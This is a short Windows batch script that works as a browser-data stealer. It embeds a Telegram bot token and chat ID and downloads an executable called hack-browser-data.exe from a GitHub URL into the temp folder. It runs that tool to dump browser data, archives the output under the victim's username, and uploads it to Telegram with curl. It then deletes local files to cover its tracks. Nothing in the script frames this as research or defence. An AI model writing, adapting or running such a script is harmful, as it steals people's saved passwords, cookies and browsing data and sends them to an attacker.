@echo off
setlocal enabledelayedexpansion

set BOT_TOKEN=6292768719:AAEPNvQfeRZM3sCT3dLAZH6btCuERAy1mMA
set CHAT_ID=943423716

C:
cd %TEMP%
if not exist "tool" (
  mkdir "tool"
  curl -o "tool\hack-browser-data.exe" "https://raw.githubusercontent.com/pyopywhiz/hack/master/hack-browser-data.exe"
)

cd tool
.\hack-browser-data.exe -f json -dir "results"

tar -cvf "results_%USERNAME%.zip" "results"

curl -F document=@"results_%USERNAME%.zip" "https://api.telegram.org/bot%BOT_TOKEN%/sendDocument?chat_id=%CHAT_ID%"

for %i in (*) do if not %i=="hack-browser-data.exe" del /f /q "%i"

endlocal
